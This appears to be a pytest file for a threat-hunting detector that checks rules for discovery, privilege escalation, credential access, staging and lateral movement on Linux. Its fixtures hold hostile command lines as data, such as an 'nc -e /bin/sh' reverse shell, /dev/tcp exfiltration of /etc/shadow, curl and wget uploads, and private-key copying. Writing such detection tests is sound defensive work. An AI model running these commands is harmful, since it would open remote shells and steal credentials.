"""Context-rule catalog: anchor-gated discovery, privilege, credential, staging and lateral rules.

Each rule gets malicious positives, hard-benign lookalikes, without-anchor and disallowed-link cases, a
missing-field case that becomes positive_only_partial (never a clean no-match), lane-policy checks, and
adversarial negatives for the token-aware parsing (grep /dev/tcp, sudo ls -l, scp upload target, local rsync,
env shebang, nc -e, wget -T, tar x/xf, gzip -d, internal-source login). Fixtures use general Linux tradecraft,
never any evaluation dataset's commands, hosts or addresses.
"""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.agent.models import PivotCoverage
from romulus.decide.policy import decide
from romulus.detect.base import ContextAnchor, ContextLink
from romulus.detect.context import (
    CredentialAccessInContext,
    LateralMovement,
    PostAccessDiscovery,
    PrivilegeProbing,
    StagingAndTransfer,
)
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.hunt.context import evaluate_context
from romulus.hunt.expansion import ExpansionEngine
from romulus.hunt.links import LinkResult
from romulus.hunt.publish import publish_match
from romulus.sources.models import Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)


def exec_event(event_id, argv, *, executable=None, outcome=Outcome.success, ts=T0, host="web1", session=42,
               **fields):
    typed = {
        "process.executable": fv(executable or argv[0], f"{event_id}:exe"),
        "process.argv": fv(argv, f"{event_id}:argv"),
    }
    if session is not None:
        typed["process.session_id"] = fv(session, f"{event_id}:ses")
    for name, value in fields.items():
        typed[name.replace("__", ".")] = fv(value, f"{event_id}:{name}")
    return TypedEvent(id=event_id, family="process_exec", ts=ts, host=host, outcome=outcome, fields=typed,
                      raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def socket_event(event_id, dst_ip, dst_port, *, syscall="connect", outcome=Outcome.success, ts=T0, host="web1",
                 session=42):
    return TypedEvent(
        id=event_id, family="net_socket", ts=ts, host=host, outcome=outcome,
        fields={"socket.syscall": fv(syscall, f"{event_id}:sc"), "destination.ip": fv(dst_ip, f"{event_id}:dip"),
                "destination.port": fv(dst_port, f"{event_id}:dport"),
                "process.session_id": fv(session, f"{event_id}:ses")},
        raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def auth_event(event_id, *, service="sshd", outcome=Outcome.success, source=None, user="root", phase=None,
               session=42, ts=T0):
    typed = {"auth.service": fv(service, f"{event_id}:svc"), "user.name": fv(user, f"{event_id}:user")}
    if source is not None:
        typed["source.ip"] = fv(source, f"{event_id}:src")
    if phase is not None:
        typed["auth.phase"] = fv(phase, f"{event_id}:phase")
    if session is not None:
        typed["process.session_id"] = fv(session, f"{event_id}:ses")
    return TypedEvent(id=event_id, family="auth", ts=ts, host="web1", outcome=outcome, fields=typed,
                      raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def anchor(anchor_class="execution"):
    return ContextAnchor(id="F-anchor", anchor_class=anchor_class, lane="urgent",
                         claim="a foothold was recorded", events=[exec_event("anchor-event", ["/bin/sh"])])


def link(strength="observed", link_type="process_lineage", status="complete"):
    return ContextLink(id="L-link", link_type=link_type, strength=strength,
                       key={"host": "web1", "process.session_id": 42},
                       evidence_events=[exec_event("link-event", ["/bin/sh"])], status=status)


def one(playbook, events, *, a=None, link_type="process_lineage", strength="observed"):
    return playbook().consume_linked(a or anchor(), link(strength=strength, link_type=link_type), events)


def _repo():
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": []}, "digest", "test")
    return repo


def _cell(repo, rule_id):
    return next(c for c in repo.rule_cells("h1") if c["rule_id"] == rule_id)


# ------------------------------------------------------------------------------------------------
# Post-access discovery.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["ps", "aux"], "/usr/bin/ps", "T1057"),
    (["ss", "-tunap"], "/usr/bin/ss", "T1049"),
    (["cat", "/etc/os-release"], "/usr/bin/cat", "T1082"),
    (["cat", "/etc/passwd"], "/usr/bin/cat", "T1087"),
    (["df", "-h"], "/usr/bin/df", "T1680"),
    (["systemctl", "list-units"], "/usr/bin/systemctl", "T1007"),
    (["crontab", "-l"], "/usr/bin/crontab", "T1007"),
    (["dpkg", "-l"], "/usr/bin/dpkg", "T1518"),
    (["rpm", "-qa"], "/usr/bin/rpm", "T1518"),
    (["find", "/home", "-name", "*.key"], "/usr/bin/find", "T1083"),
    (["ls", "-la", "/root"], "/usr/bin/ls", "T1083"),
    (["printenv"], "/usr/bin/printenv", "T1082"),
    (["showmount", "-e", "server"], "/usr/sbin/showmount", "T1135"),
    (["chage", "-l", "svc"], "/usr/bin/chage", "T1201"),
])
def test_discovery_single_class_is_a_lead(argv, executable, technique):
    matches = one(PostAccessDiscovery, [exec_event("d", argv, executable=executable)])
    assert len(matches) == 1 and technique in matches[0].notes
    assert matches[0].proposed_lane == "lead" and decide(matches[0], "h").admitted


def test_discovery_burst_of_three_distinct_classes_is_high():
    events = [exec_event("a", ["whoami"], executable="/usr/bin/whoami"),
              exec_event("b", ["uname", "-a"], executable="/usr/bin/uname"),
              exec_event("c", ["ss", "-tunap"], executable="/usr/bin/ss")]
    match = one(PostAccessDiscovery, events)[0]
    assert match.proposed_lane == "high"
    assert {"T1033", "T1082", "T1049"} <= set(match.notes)


@pytest.mark.parametrize("argv,executable", [
    (["apt", "install", "nginx"], "/usr/bin/apt"),
    (["dpkg", "-i", "pkg.deb"], "/usr/bin/dpkg"),
    (["systemctl", "restart", "nginx"], "/usr/bin/systemctl"),
    (["ip", "addr", "add", "10.0.0.5/24", "dev", "eth0"], "/usr/sbin/ip"),
    (["hostname", "web99"], "/usr/bin/hostname"),            # sets the hostname, not discovery
    (["route", "add", "default", "gw", "10.0.0.1"], "/sbin/route"),
    (["arp", "-d", "10.0.0.9"], "/usr/sbin/arp"),
    (["ls", "-la", "/tmp"], "/usr/bin/ls"),
    (["env", "python3", "./x.py"], "/usr/bin/env"),         # a shebang launcher, not enumeration
    (["echo", "cat /etc/passwd"], "/usr/bin/echo"),
])
def test_discovery_rejects_benign_and_modifying_forms(argv, executable):
    assert one(PostAccessDiscovery, [exec_event("b", argv, executable=executable)]) == []


def test_discovery_gating_and_kernel_executable():
    ev = [exec_event("d", ["ss", "-tunap"], executable="/usr/bin/ss")]
    assert PostAccessDiscovery().consume_linked(None, link(), ev) == []
    assert one(PostAccessDiscovery, ev, link_type="host_after_anchor") == []
    assert one(PostAccessDiscovery, ev, a=anchor("network_observation")) == []
    # argv[0] is spoofable; identity comes from the kernel executable.
    assert one(PostAccessDiscovery, [exec_event("s", ["whoami"], executable="/usr/bin/echo")]) == []
    assert one(PostAccessDiscovery, [exec_event("r", ["evil"], executable="/usr/bin/whoami")])


def test_discovery_inferred_link_caps_at_lead():
    events = [exec_event("a", ["whoami"], executable="/usr/bin/whoami"),
              exec_event("b", ["uname", "-a"], executable="/usr/bin/uname"),
              exec_event("c", ["ss"], executable="/usr/bin/ss")]
    match = one(PostAccessDiscovery, events, strength="inferred")[0]
    assert match.proposed_lane == "lead"


# ------------------------------------------------------------------------------------------------
# Privilege probing and escalation.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["sudo", "-l"], "/usr/bin/sudo", "T1548.003"),
    (["sudo", "-u", "root", "-l"], "/usr/bin/sudo", "T1548.003"),
    (["find", "/", "-perm", "-4000"], "/usr/bin/find", "T1548.001"),
    (["find", "/", "-perm", "-u=s"], "/usr/bin/find", "T1548.001"),
    (["getcap", "-r", "/"], "/usr/sbin/getcap", "T1548"),
    (["pkexec", "/bin/sh"], "/usr/bin/pkexec", "T1548"),
    (["cat", "/etc/sudoers"], "/usr/bin/cat", "T1548.003"),
])
def test_privilege_probing_positives_are_lead(argv, executable, technique):
    match = one(PrivilegeProbing, [exec_event("p", argv, executable=executable)])
    assert len(match) == 1 and technique in match[0].notes and match[0].proposed_lane == "lead"
    assert decide(match[0], "h").admitted


@pytest.mark.parametrize("argv,executable", [
    (["sudo", "ls", "-la"], "/usr/bin/sudo"),
    (["sudo", "crontab", "-l"], "/usr/bin/sudo"),
    (["sudo", "wc", "-l", "f"], "/usr/bin/sudo"),
    (["find", "/var/log", "-name", "*.log"], "/usr/bin/find"),
])
def test_privilege_probing_rejects_child_flags_and_plain_find(argv, executable):
    assert one(PrivilegeProbing, [exec_event("b", argv, executable=executable)]) == []


def _root_chain():
    """A non-root login shell (pid 100) under which later root records are spawned."""
    return exec_event("sh", ["bash"], executable="/bin/bash", process__uid="1000", process__euid="1000",
                      process__auid="1000", process__pid=100, process__ppid=50, ts=T0)


def test_privilege_escalation_unbrokered_root_transition_is_high_with_provenance():
    shell = _root_chain()
    root = exec_event("x", ["/tmp/x/exploit"], executable="/tmp/x/exploit", process__uid="0", process__euid="0",
                      process__auid="1000", process__pid=200, process__ppid=100, ts=T0 + timedelta(seconds=3))
    matches = [m for m in one(PrivilegeProbing, [shell, root]) if "euid0" in m.group_key]
    assert len(matches) == 1 and {"T1548", "T1068"} <= set(matches[0].notes)
    assert matches[0].proposed_lane == "high" and "auid=1000" in matches[0].claim and "uid=0" in matches[0].claim
    fields = {p.field for p in matches[0].predicate}
    assert "process.uid" in fields and "process.auid" in fields


def test_privilege_escalation_brokered_root_transition_is_lead():
    shell = _root_chain()
    sudo = exec_event("su", ["sudo", "-s"], executable="/usr/bin/sudo", process__uid="1000", process__euid="0",
                      process__auid="1000", process__pid=150, process__ppid=100, ts=T0 + timedelta(seconds=1))
    root_shell = exec_event("rs", ["bash"], executable="/bin/bash", process__uid="0", process__euid="0",
                            process__auid="1000", process__pid=160, process__ppid=150, ts=T0 + timedelta(seconds=2))
    matches = [m for m in one(PrivilegeProbing, [shell, sudo, root_shell]) if "euid0" in m.group_key]
    assert len(matches) == 1 and matches[0].proposed_lane == "lead" and "brokered" in matches[0].claim
    assert "T1068" not in matches[0].notes


def test_privilege_escalation_later_unbrokered_root_after_sudo_is_its_own_high_finding():
    shell = _root_chain()
    sudo = exec_event("su", ["sudo", "apt", "update"], executable="/usr/bin/sudo", process__uid="1000",
                      process__euid="0", process__auid="1000", process__pid=150, process__ppid=100,
                      ts=T0 + timedelta(seconds=1))
    sudo_root = exec_event("sr", ["apt", "update"], executable="/usr/bin/apt", process__uid="0", process__euid="0",
                           process__auid="1000", process__pid=160, process__ppid=150, ts=T0 + timedelta(seconds=2))
    exploit = exec_event("ex", ["/tmp/x/exploit"], executable="/tmp/x/exploit", process__uid="0",
                         process__euid="0", process__auid="1000", process__pid=300, process__ppid=100,
                         ts=T0 + timedelta(hours=1))
    euid0 = [m for m in one(PrivilegeProbing, [shell, sudo, sudo_root, exploit]) if "euid0" in m.group_key]
    assert len(euid0) == 2
    high = [m for m in euid0 if m.proposed_lane == "high"]
    assert len(high) == 1 and "exploit" in high[0].claim and "T1068" in high[0].notes


def test_setuid_euid_only_elevation_is_lead_without_t1068():
    passwd = exec_event("p", ["passwd"], executable="/usr/bin/passwd", process__uid="1000", process__euid="0",
                        process__auid="1000", process__pid=120, process__ppid=100)
    matches = [m for m in one(PrivilegeProbing, [passwd]) if "setuid" in m.group_key]
    assert len(matches) == 1 and matches[0].proposed_lane == "lead" and matches[0].notes == ["T1548"]


@pytest.mark.parametrize("uid,euid,auid", [("0", "0", "0"), ("1000", None, "1000")])
def test_privilege_escalation_benign_root_identities(uid, euid, auid):
    fields = {"process__uid": uid, "process__auid": auid, "process__pid": 120, "process__ppid": 100}
    if euid is not None:
        fields["process__euid"] = euid
    out = [m for m in one(PrivilegeProbing, [exec_event("b", ["id"], executable="/usr/bin/id", **fields)])
           if "euid0" in m.group_key or "setuid" in m.group_key]
    assert out == []


# ------------------------------------------------------------------------------------------------
# Credential access.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique,lane", [
    (["cat", "/etc/shadow"], "/usr/bin/cat", "T1003.008", "high"),
    (["cp", "/home/alice/.ssh/id_rsa", "/tmp/k"], "/usr/bin/cp", "T1552.004", "high"),
    (["cp", "-t", "/tmp", "/home/alice/.ssh/id_ed25519"], "/usr/bin/cp", "T1552.004", "high"),
    (["cat", "/proc/1234/mem"], "/usr/bin/cat", "T1003", "high"),
    (["cat", "/home/alice/.bash_history"], "/usr/bin/cat", "T1552.003", "lead"),
    (["cat", "/home/alice/.aws/credentials"], "/usr/bin/cat", "T1552.001", "lead"),
    (["cat", "/home/alice/.netrc"], "/usr/bin/cat", "T1552.001", "lead"),
])
def test_credential_access_tiers(argv, executable, technique, lane):
    match = one(CredentialAccessInContext, [exec_event("c", argv, executable=executable,
                                                        process__cwd="/home/alice")], a=anchor("credential_access"))
    assert len(match) == 1 and technique in match[0].notes and match[0].proposed_lane == lane


@pytest.mark.parametrize("argv", [
    ["cat", "/home/alice/.ssh/id_rsa.pub"],
    ["cat", "/home/alice/.ssh/known_hosts"],
    ["cat", "/home/alice/.ssh/authorized_keys"],
    ["cat", "/etc/hostname"],
    ["cat", "/home/alice/.gnupg/gpg.conf"],
    ["cat", "/home/alice/mynetrc"],
])
def test_credential_access_benign_lookalikes(argv):
    assert one(CredentialAccessInContext, [exec_event("b", argv, executable=f"/usr/bin/{argv[0]}")],
               a=anchor("credential_access")) == []


# ------------------------------------------------------------------------------------------------
# Staging and transfer.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["tar", "czf", "/tmp/out.tgz", "/etc"], "/bin/tar", "T1560.001"),
    (["tar", "-czf", "/tmp/out.tgz", "/etc"], "/bin/tar", "T1560.001"),
    (["base64", "/home/alice/report.docx"], "/usr/bin/base64", "T1027.013"),
    (["scp", "/tmp/out.tgz", "user@203.0.113.9:/tmp/"], "/usr/bin/scp", "T1021.004"),
    (["curl", "-T", "/tmp/out.tgz", "http://files.example.test/u"], "/usr/bin/curl", "T1048"),
    (["wget", "--post-file=/tmp/out.tgz", "http://x.test/u"], "/usr/bin/wget", "T1048"),
    (["nc", "-e", "/bin/sh", "203.0.113.9", "4444"], "/bin/nc", "T1048"),
])
def test_staging_transfer_positives_default_lead(argv, executable, technique):
    match = one(StagingAndTransfer, [exec_event("s", argv, executable=executable)])
    assert len(match) == 1 and technique in match[0].notes and match[0].proposed_lane == "lead"


def test_staging_devtcp_only_from_shell_c_redirect():
    good = exec_event("g", ["bash", "-c", "cat f > /dev/tcp/203.0.113.9/443"], executable="/bin/bash")
    assert "T1048" in one(StagingAndTransfer, [good])[0].notes
    grep = exec_event("x", ["grep", "-rn", "/dev/tcp/", "/var/www"], executable="/bin/grep")
    echo = exec_event("e", ["echo", "connect /dev/tcp/h/1"], executable="/bin/echo")
    assert one(StagingAndTransfer, [grep]) == [] and one(StagingAndTransfer, [echo]) == []


@pytest.mark.parametrize("argv,executable", [
    (["tar", "xzf", "/tmp/out.tgz"], "/bin/tar"),
    (["tar", "xf", "/tmp/backup.tgz"], "/bin/tar"),
    (["gzip", "-d", "/etc/passwd.gz"], "/bin/gzip"),
    (["base64", "-d", "/etc/shadow.b64"], "/usr/bin/base64"),
    (["base64", "/tmp/token.txt"], "/usr/bin/base64"),
    (["scp", "/tmp/a", "/tmp/b"], "/usr/bin/scp"),
    (["rsync", "-a", "/srv/a/", "/srv/b/"], "/usr/bin/rsync"),
    (["curl", "http://repo.example.test/pkg"], "/usr/bin/curl"),
    (["wget", "-T", "30", "http://x.test/y.deb"], "/usr/bin/wget"),
])
def test_staging_transfer_benign_lookalikes(argv, executable):
    assert one(StagingAndTransfer, [exec_event("b", argv, executable=executable)]) == []


def test_staging_high_when_sensitive_input_staged_and_session_also_transfers():
    staged = exec_event("a", ["base64", "/home/alice/secrets.txt"], executable="/usr/bin/base64",
                        ts=T0 + timedelta(seconds=1))
    out = exec_event("b", ["scp", "/tmp/s.b64", "user@203.0.113.9:/tmp/"], executable="/usr/bin/scp",
                     ts=T0 + timedelta(seconds=2))
    match = one(StagingAndTransfer, [staged, out])[0]
    assert match.proposed_lane == "high" and {"T1027.013", "T1021.004"} <= set(match.notes)


# ------------------------------------------------------------------------------------------------
# Lateral movement.
# ------------------------------------------------------------------------------------------------

def test_lateral_ssh_client_alone_is_lead_with_target():
    match = one(LateralMovement, [exec_event("l", ["ssh", "admin@10.0.0.9", "id"], executable="/usr/bin/ssh")])
    assert len(match) == 1 and "T1021.004" in match[0].notes and match[0].proposed_lane == "lead"
    assert "10.0.0.9" in match[0].claim


def test_lateral_scp_target_is_the_remote_host_not_a_local_path():
    match = one(LateralMovement, [exec_event("l", ["scp", "/etc/shadow", "user@10.0.0.5:/tmp/"],
                                             executable="/usr/bin/scp")])
    assert len(match) == 1 and "10.0.0.5" in match[0].claim and "/etc/shadow" not in match[0].group_key


def test_lateral_socket_alone_is_lead_but_client_plus_connect_is_high():
    socket_only = one(LateralMovement, [socket_event("sk", "10.0.0.9", 445)])
    assert len(socket_only) == 1 and socket_only[0].proposed_lane == "lead"

    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", ts=T0)
    connect = socket_event("sk2", "10.0.0.9", 22, ts=T0 + timedelta(seconds=2))
    both = one(LateralMovement, [client, connect])
    high = [m for m in both if "addr:10.0.0.9:22" in m.group_key]
    assert high and high[0].proposed_lane == "high" and "T1021.004" in high[0].notes


def test_lateral_unknown_connect_outcome_worded_not_dropped():
    match = one(LateralMovement, [socket_event("sk", "10.0.0.9", 22, outcome=Outcome.unknown)])
    assert len(match) == 1 and "connect() outcome is unknown" in match[0].claim


@pytest.mark.parametrize("event", [
    socket_event("ext", "203.0.113.9", 22),
    socket_event("web", "10.0.0.9", 443),
    socket_event("acc", "10.0.0.9", 22, syscall="accept"),
    socket_event("lo", "127.0.0.1", 22),
    socket_event("ll", "169.254.1.1", 22),
])
def test_lateral_socket_benign_lookalikes(event):
    assert one(LateralMovement, [event]) == []


def test_lateral_local_rsync_is_not_lateral():
    assert one(LateralMovement, [exec_event("r", ["rsync", "-a", "/srv/a/", "/srv/b/"],
                                            executable="/usr/bin/rsync")]) == []


def test_lateral_gated_by_anchor_and_link():
    ev = [socket_event("sk", "10.0.0.9", 22)]
    assert LateralMovement().consume_linked(None, link(), ev) == []
    assert one(LateralMovement, ev, a=anchor("network_observation")) == []


# ------------------------------------------------------------------------------------------------
# Missing fields are counted, never a clean no-match (I3, I10).
# ------------------------------------------------------------------------------------------------

def test_missing_exec_fields_give_positive_only_partial():
    broken = TypedEvent(id="m", family="process_exec", ts=T0, host="web1", outcome=Outcome.success,
                        fields={"process.argv": fv(["id"], "m:argv")},
                        raw=[RawRef(target="host-x", native_id="m", digest="d")], normalizer="test@1")
    for rule_id in ("context.post_access_discovery", "context.privilege_probing",
                    "context.credential_access", "context.staging_and_transfer"):
        repo = _repo()
        evaluate_context(repo, "h1", anchor(), link(), [broken])
        cell = _cell(repo, rule_id)
        assert cell["state"] in ("positive_only_partial", "evaluated_partial")
        assert cell["detail"]["missing_required"] >= 1


def test_lateral_missing_socket_fields_give_positive_only_partial():
    broken = TypedEvent(id="s", family="net_socket", ts=T0, host="web1", outcome=Outcome.success,
                        fields={"socket.syscall": fv("connect", "s:sc")},
                        raw=[RawRef(target="host-x", native_id="s", digest="d")], normalizer="test@1")
    repo = _repo()
    evaluate_context(repo, "h1", anchor(), link(), [broken])
    cell = _cell(repo, "context.lateral_movement")
    assert cell["state"] in ("positive_only_partial", "evaluated_partial")
    assert cell["detail"]["missing_required"] >= 1


# ------------------------------------------------------------------------------------------------
# End-to-end through ExpansionEngine (lateral client + connect -> high).
# ------------------------------------------------------------------------------------------------

WINDOW = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=1))


class _SessionFetcher:
    """Returns both a remote-client exec and an admin-port socket connect through the login_session link,
    at the far edge of the first window (a timestamp-boundary case)."""

    def __init__(self, repo, linked):
        self.repo, self.linked = repo, linked
        self.executor = type("Counter", (), {"source_queries": 0})()

    def fetch(self, anchor_, link_type, window, *, query_cap=None):
        self.executor.source_queries += 1
        ids = [e.id for e in self.linked] if link_type == "login_session" else []
        return LinkResult(
            id=f"L-{anchor_.finding_id}-{link_type}-{window.label}", anchor_id=anchor_.finding_id,
            link_type=link_type, window=window, strength="observed",
            key={"host": anchor_.host, "process.session_id": 42}, status="complete",
            event_ids=ids, evidence_ids=sorted(anchor_.event_ids + ids), task_ids=["T1"],
            coverage=[PivotCoverage(target="host-x", dataset="linux.audit", start=window.start,
                                    end=window.end, status="complete", returned=len(ids), total=len(ids))],
            query_spend=1)


def test_expansion_engine_publishes_high_lateral_finding():
    repo = _repo()
    repo.create_hunt("he", {"window": {"start": WINDOW.start.isoformat(), "end": WINDOW.end.isoformat()},
                            "style": "broad", "targets": [], "pack": {"version": "test", "playbooks": []},
                            "agent_mode": "off", "budgets": {"wall_clock_minutes": 120}}, "digest", "test")
    anchor_exec = exec_event("anchor-event", ["/bin/sh"], host="web1", process__pid=10)
    repo.save_evidence("he", [anchor_exec], {}, None)
    repo.save_candidate({
        "id": "F-anchor", "hunt_id": "he", "rule_id": "host.web_shell", "rule_version": "1",
        "claim": "web service spawned a shell", "claim_type": "observed_action",
        "event_ids": [anchor_exec.id], "predicate_fields": [], "entities": [["host", "web1", "host"]],
        "ts": anchor_exec.ts, "severity": "critical", "confidence": "high", "lane": "urgent",
        "priority": 100.0, "priority_reasons": [], "gate_results": {}, "benign_alternatives": [],
        "next_checks": [], "source_case_id": None, "source_anchor_id": None, "source_link_id": None})
    boundary = T0 + timedelta(minutes=5)
    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", ts=T0 + timedelta(minutes=1),
                        host="web1")
    connect = socket_event("sk", "10.0.0.9", 22, ts=boundary, host="web1")
    repo.save_evidence("he", [client, connect], {}, None)

    ExpansionEngine(repo, "he", WINDOW, _SessionFetcher(repo, [client, connect]), max_source_queries=200).run()

    lateral = [c for c in repo.candidates("he") if c["rule_id"] == "context.lateral_movement"]
    assert any(c["lane"] == "high" and "10.0.0.9:22" in c["claim"] for c in lateral)
    assert all(c["source_anchor_id"] == "F-anchor" for c in lateral)


# ------------------------------------------------------------------------------------------------
# Citations vs claims, parse failures, per-tool grammars, and lateral target/lineage matching.
# ------------------------------------------------------------------------------------------------

def test_discovery_cites_every_record_and_claim_total_matches():
    events = [exec_event(f"d{i}", ["cat", "/etc/hosts"], executable="/usr/bin/cat", ts=T0 + timedelta(seconds=i))
              for i in range(15)]
    match = one(PostAccessDiscovery, events)[0]
    cited = [e for e in match.events if e.id.startswith("d")]
    assert len(cited) == 15 and "15 command(s)" in match.claim
    assert len([p for p in match.predicate if p.field == "process.executable"]) == 15


def test_merge_from_wider_window_rebuilds_claim_to_the_union():
    repo = _repo()
    narrow = [exec_event(f"n{i}", ["ss", "-tunap"], executable="/usr/bin/ss", ts=T0 + timedelta(seconds=i))
              for i in range(3)]
    wide = narrow + [exec_event(f"w{i}", ["ss", "-tunap"], executable="/usr/bin/ss",
                                ts=T0 + timedelta(seconds=10 + i)) for i in range(12)]
    first = PostAccessDiscovery().consume_linked(anchor(), link(), narrow)[0]
    publish_match(repo, "h1", PostAccessDiscovery(), first, None, {}, source_anchor_id="F-anchor",
                  source_link_id="L1", context_reach={"anchor_id": "F-anchor", "link_id": "L1",
                                                      "link_type": "process_lineage", "strength": "observed"})
    wider = PostAccessDiscovery().consume_linked(anchor(), link(), wide)[0]
    publish_match(repo, "h1", PostAccessDiscovery(), wider, None, {}, source_anchor_id="F-anchor",
                  source_link_id="L2", context_reach={"anchor_id": "F-anchor", "link_id": "L2",
                                                      "link_type": "process_lineage", "strength": "observed"})
    candidates = [c for c in repo.candidates("h1") if c["rule_id"] == "context.post_access_discovery"]
    assert len(candidates) == 1
    assert "15 command(s)" in candidates[0]["claim"]
    assert len([e for e in candidates[0]["event_ids"] if e.startswith(("n", "w"))]) == 15


def test_unparseable_shell_c_script_counts_as_partial():
    broken = exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 2>&1"],
                        executable="/bin/bash")
    repo = _repo()
    evaluate_context(repo, "h1", anchor(), link(), [broken])
    cell = _cell(repo, "context.staging_and_transfer")
    assert cell["detail"]["missing_required"] >= 1 and cell["state"] != "no_match_complete"


def test_staging_inbound_devtcp_is_ingress_not_transfer():
    inbound = exec_event("i", ["bash", "-c", "cat < /dev/tcp/10.0.0.9/80"], executable="/bin/bash")
    match = one(StagingAndTransfer, [inbound])[0]
    assert "T1105" in match.notes and "T1048" not in match.notes and "reads from" in match.claim


@pytest.mark.parametrize("argv,is_upload", [
    (["curl", "-d", "email=a@b.com", "http://x.test/f"], False),
    (["curl", "--data-raw", "a@b", "http://x.test/f"], False),
    (["curl", "-d", "@/tmp/secret", "http://x.test/f"], True),
    (["curl", "-F", "a=b", "http://x.test/f"], False),
    (["curl", "-F", "file=@/tmp/secret", "http://x.test/f"], True),
])
def test_curl_file_upload_grammar(argv, is_upload):
    match = one(StagingAndTransfer, [exec_event("c", argv, executable="/usr/bin/curl")])
    assert bool(match) == is_upload


def test_scp_push_is_transfer_but_pull_is_ingress():
    push = one(StagingAndTransfer, [exec_event("p", ["scp", "/tmp/a", "user@10.0.0.9:/tmp/"],
                                              executable="/usr/bin/scp")])[0]
    assert "T1021.004" in push.notes and "outbound" in push.claim
    pull = one(StagingAndTransfer, [exec_event("q", ["scp", "user@10.0.0.9:/etc/passwd", "/tmp/"],
                                              executable="/usr/bin/scp")])[0]
    assert "T1105" in pull.notes and "inbound" in pull.claim and pull.proposed_lane == "lead"


def test_zip_recursive_and_tar_chdir_inputs_are_staged():
    zipped = one(StagingAndTransfer, [exec_event("z", ["zip", "-r", "/tmp/out.zip", "/etc"],
                                                executable="/usr/bin/zip")])[0]
    assert "T1560.001" in zipped.notes
    tarred = one(StagingAndTransfer, [exec_event("t", ["tar", "czf", "/tmp/o.tgz", "-C", "/", "etc"],
                                                executable="/bin/tar", process__cwd="/tmp")])[0]
    assert "T1560.001" in tarred.notes and "/etc" in tarred.claim


def test_lateral_cross_target_connect_stays_lead():
    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", process__pid=100, ts=T0)
    connect = socket_event("sk", "10.0.0.8", 22, ts=T0 + timedelta(seconds=2))
    connect = connect.model_copy(update={"fields": {**connect.fields, "process.pid": fv(900, "sk:pid"),
                                                    "process.ppid": fv(800, "sk:ppid")}})
    both = one(LateralMovement, [client, connect])
    socket_group = [m for m in both if "addr:10.0.0.8:22" in m.group_key]
    assert socket_group and socket_group[0].proposed_lane == "lead" and "temporal" in socket_group[0].claim


def test_lateral_connect_matched_by_process_lineage_is_high():
    client = exec_event("cl", ["ssh", "jump"], executable="/usr/bin/ssh", process__pid=100, ts=T0)
    connect = socket_event("sk", "10.0.0.9", 22, ts=T0 + timedelta(seconds=2))
    connect = connect.model_copy(update={"fields": {**connect.fields, "process.pid": fv(101, "sk:pid"),
                                                    "process.ppid": fv(100, "sk:ppid")}})
    both = one(LateralMovement, [client, connect])
    high = [m for m in both if "addr:10.0.0.9:22" in m.group_key]
    assert high and high[0].proposed_lane == "high"


@pytest.mark.parametrize("source,expect", [
    ("203.0.113.8", "high"), (None, "lead")])
def test_entry_point_external_high_sourceless_lead(source, expect):
    from romulus.detect.context import EntryPointPromotion
    login = auth_event("lg", source=source, phase="login")
    link_ = ContextLink(id="L", link_type="login_session", strength="observed",
                        key={"process.session_id": 42}, evidence_events=[], status="complete")
    match = EntryPointPromotion().consume_linked(anchor("credential_access"), link_, [login])
    assert len(match) == 1 and match[0].proposed_lane == expect
    if source is None:
        assert "not confirmed external" in match[0].claim


def test_entry_point_internal_source_not_promoted():
    from romulus.detect.context import EntryPointPromotion
    internal = auth_event("in", source="10.0.0.8", phase="login")
    sourceless = auth_event("so", source=None, phase="session_open")
    link_ = ContextLink(id="L", link_type="login_session", strength="observed",
                        key={"process.session_id": 42}, evidence_events=[], status="complete")
    assert EntryPointPromotion().consume_linked(anchor("credential_access"), link_, [internal, sourceless]) == []
